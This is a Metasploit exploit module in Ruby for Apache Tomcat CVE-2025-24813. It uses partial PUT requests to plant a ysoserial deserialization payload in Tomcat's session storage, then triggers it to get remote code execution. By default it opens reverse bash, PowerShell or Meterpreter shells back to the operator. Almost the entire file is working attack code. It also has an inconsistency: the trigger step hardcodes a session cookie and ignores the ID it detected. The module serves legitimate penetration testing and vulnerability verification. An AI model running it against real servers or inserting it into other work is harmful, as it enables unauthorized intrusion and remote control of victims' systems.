##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Tomcat Partial PUT RCE (CVE-2025-24813)',
        'Description' => %q{
          This module exploits a vulnerability in Apache Tomcat (CVE-2025-24813) that allows
          remote code execution via partial PUT requests under specific conditions. The issue
          stems from improper handling of temporary files during partial PUT uploads, which
          can be exploited to inject malicious serialized objects into file-based session
          persistence, leading to deserialization-based RCE if a vulnerable library is present.

          Affected versions include Tomcat 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, and
          9.0.0.M1 to 9.0.98. The exploit requires:
          - Writes enabled for the default servlet (disabled by default)
          - Partial PUT support (enabled by default)
          - File-based session persistence with a vulnerable deserialization library

          Users should upgrade to Tomcat 11.0.3, 10.1.35, or 9.0.99 to mitigate the issue.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'COSCO Shipping Lines DIC', # Original research
          'sw0rd1ight (https://github.com/sw0rd1ight)', # Original research
          'westonsteimel', # Github Advisory
          'Rudraditya Thakur (h4ck3r-04)' # Metasploit module
        ],
        'References' => [
          ['CVE', '2025-24813'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-24813'],
          ['URL', 'https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq'],
          ['URL', 'http://www.openwall.com/lists/oss-security/2025/03/10/5'],
          ['URL', 'https://github.com/absholi7ly/POC-CVE-2025-24813/blob/main/README.md'],
        ],
        'Platform' => ['win', 'linux', 'unix'],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => { 'Payload' => 'cmd/unix/reverse_bash' }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd,
              'DefaultOptions' => { 'Payload' => 'cmd/windows/powershell/reverse_tcp' }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_dropper,
              'DefaultOptions' => { 'Payload' => 'windows/x64/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-03-10',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the Tomcat app', '/']),
      OptString.new('SESSION_ID', [false, 'Target session ID (default: auto-detect)', '']),
      OptString.new('YSOSERIAL_PATH', [true, 'Path to ysoserial.jar', '/path/to/ysoserial.jar']),
      OptString.new('GADGET', [true, 'ysoserial gadget chain', 'CommonsCollections6']),
      OptBool.new('VERIFY_SSL', [true, 'Verify SSL certificate', true])
    ])
  end

  def check
    vprint_status("Checking if #{peer} is vulnerable.")
    res = check_writable_servlet
    return CheckCode::Unknown('No response from target.') unless res
    return CheckCode::Safe('Target is not Apache Tomcat.') unless res.headers['Server']
    return CheckCode::Appears('Partial PUT supported; further conditions need verification.') if res.code == 201 || res.code == 204
    CheckCode::Safe("Partial PUT not supported or writes disabled (HTTP #{res.code}.")
  end

  def exploit
    print_status("Checking target vulnerability...")
    unless check_writable_servlet&.code == 201 || check_writable_servlet&.code == 204
      fail_with(Failure::NotVulnerable, 'Target does not support partial PUT or writes are disabled.')
    end

    session_id = datastore['SESSION_ID'].empty? ? get_session_id : datastore['SESSION_ID']
    print_status("Using session ID: #{session_id}")

    payload_file = generate_ysoserial_payload
    print_status("Generated payload: #{payload_file}")

    if upload_and_verify_payload(session_id, payload_file)
      print_good("Exploit succeeded! Payload uploaded and triggered.")
      case target['Type']
      when :unix_cmd, :windows_cmd
        print_status("Command payload executed.")
      when :linux_dropper, :windows_dropper
        execute_cmdstager
      end
    else
      fail_with(Failure::UnexpectedReply, 'Exploit failed during upload or verification.')
    end

    FileUtils.rm(payload_file) if File.exist?(payload_file)
    print_status("Cleaned up temporary file: #{payload_file}")
  end

  def check_writable_servlet
    check_uri = normalize_uri(target_uri.path, 'check.txt')
    send_request_cgi({
      'method' => 'PUT',
      'uri' => check_uri,
      'headers' => {
        'Content-Length' => '10000',
        'Content-Range' => 'bytes 0-1000/1200'
      },
      'data' => 'testdata',
      'timeout' => 10,
      'ssl' => datastore['RPORT'] == 443,
      'verify_ssl' => datastore['VERIFY_SSL']
    })
  end

  def get_session_id
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.jsp'),
      'timeout' => 10,
      'ssl' => datastore['RPORT'] == 443,
      'verify_ssl' => datastore['VERIFY_SSL']
    })

    unless res
      fail_with(Failure::Unreachable, 'Could not retrieve session ID.')
    end

    jsessionid = res.get_cookies[/JSESSIONID=([^;]+)/, 1]
    return jsessionid if jsessionid

    session_match = res.body.match(/Session ID: (\w+)/)
    return session_match[1] if session_match

    print_status("Session ID not found; using default: absholi7ly")
    'absholi7ly'
  end

  def generate_ysoserial_payload
    payload_file = 'payload.ser'
    cmd = target['Platform'] == 'win' ? "cmd.exe /c #{payload.encoded}" : "/bin/sh -c '#{payload.encoded}'"
    print_status("Generating ysoserial payload for: #{cmd}")

    unless File.exist?(datastore['YSOSERIAL_PATH'])
      fail_with(Failure::BadConfig, "ysoserial not found at: #{datastore['YSOSERIAL_PATH']}")
    end

    begin
      system('java', '-jar', datastore['YSOSERIAL_PATH'], datastore['GADGET'], cmd, out: payload_file)
      fail_with(Failure::Unknown, 'Failed to generate ysoserial payload.') unless File.exist?(payload_file)
      payload_file
    rescue => e
      fail_with(Failure::Unknown, "Error generating payload: #{e.message}")
    end
  end

  def upload_and_verify_payload(session_id, payload_file)
    exploit_uri = normalize_uri(target_uri.path, 'uploads/../sessions/', "#{session_id}.session")
    payload_data = File.binread(payload_file)

    put_res = send_request_cgi({
      'method' => 'PUT',
      'uri' => exploit_uri,
      'headers' => {
        'Content-Length' => '10000',
        'Content-Range' => "bytes 0-1000/1200"
      },
      'data' => payload_data,
      'timeout' => 10,
      'ssl' => datastore['RPORT'] == 443,
      'verify_ssl' => datastore['VERIFY_SSL']
    })

    unless put_res&.code == 409
      print_status("Upload failed with HTTP #{put_res&.code}")
      return false
    end

    print_status("Payload uploaded successfully (HTTP 409). Triggering deserialization...")
    get_res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'headers' => { 'Cookie' => 'JSESSIONID=absholi7ly' },
      'timeout' => 10,
      'ssl' => datastore['RPORT'] == 443,
      'verify_ssl' => datastore['VERIFY_SSL']
    })

    get_res&.code == 500
  end

  def peer
    "#{datastore['RHOST']}:#{datastore['RPORT']}"
  end
end